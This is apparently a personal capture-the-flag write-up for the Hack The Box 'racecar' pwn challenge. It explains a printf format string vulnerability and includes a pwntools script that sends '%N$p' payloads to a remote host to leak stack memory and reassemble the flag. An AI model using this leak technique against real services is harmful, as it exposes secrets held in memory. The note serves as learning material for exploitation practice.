
2024-07-30 15:14

Source: #htb 
 
Tags: [[Binary Exploit]] [[Format String Vulnerabilities (printf)]]
## Gist 

- We are given a binary that takes a bunch of Boolean inputs and if it matches a randomly generated value (referred to as winning) then it gives you an option to input some data that gets stored in the stack and reveals the flag.
- now, if you win then the code checks if a `flag.txt` exists in the working directory and if it doesn't then it throws an error.
- create a `flag.txt` in the working directory and populate the file with some AAAA's further run the `pwntool` script and get the answer 
`echo AAAAAAAAAAA  >  flag.txt`
### Recon

open the file `dogbolt` online and on seeing the o/p from `Ghidra` we see - 
1. that the `flag.txt` is opened in read mode and returns a pointer to `__stream`.

2. The [[fgets]] function reads a line from the file pointed to by `__stream` (the flag) and stores it in the buffer `local_3c`, which is an array of size `0x2c` (44 bytes).

3. The `read(0, __format, 0x170)` reads my input and stores it in the buffer `__format` of size `0x170` (368 bytes).
### Vulnerability Analysis 

My input is printed at the [[printf]], but our input is not checked, hence we can perform a format string attack. 
More information about format string attacks can be read here: [https://owasp.org/www-community/attacks/Format_string_attack](https://owasp.org/www-community/attacks/Format_string_attack).

If I run the binary and give many `%p`’s, data on the stack will be leaked in hexadecimal.
when doing this you will notice some addresses as `0x41414141` these will be the `AAAA` you added to your `flag.txt`999999
### Mimick user input via pwntools

```
from pwn import *

flag = ''

# Let's fuzz x values
for i in range(100):
    try:
        # Connect to server
        io = remote('94.237.59.199', 55496)
        io.sendlineafter(b'Name: ', b'anas')
        io.sendlineafter(b'Nickname: ', b'something')
        io.sendlineafter(b'> ', b'2')
        io.sendlineafter(b'> ', b'2')
        io.sendlineafter(b'> ', b'1')
        # Format the counter
        # e.g. %i$p will attempt to print [i]th pointer (or string/hex/char/int)
        io.sendlineafter(b'> ', '%{}$p'.format(i).encode())
        # Receive the response
        io.recvline()
        io.recvline()
        result = io.recv()
        if not b'nil' in result:
            print(str(i) + ': ' + str(result))
            try:
                # Decode, reverse endianess and print
                decoded = unhex(result.strip().decode()[2:])
                reversed_hex = decoded[::-1]
                print(str(reversed_hex))
                # Build up flag
                flag += reversed_hex.decode()
            except BaseException:
                pass
    except EOFError:
        pass

# Print and close
info(flag)
io.close()
```
### References
https://app.hackthebox.com/challenges/racecar

walkthroughs - 
[Hack the Box rev HTB_RACECAR (pwnjournal.github.io)](https://pwnjournal.github.io/HTB_RACECAR/)
[HTB pwn →‘racecar’. | by Apothiphis_z | Medium](https://medium.com/@fracchetto1995/htb-pwn-racecar-f9206cfd943f)
[HTB: Racecar - remoteshell.zip](https://remoteshell.zip/racecar/)
[Racecar | WriteUps (gitbook.io)](https://sayonara.gitbook.io/writeups/hackthebox/challenges/pwn/racecar)
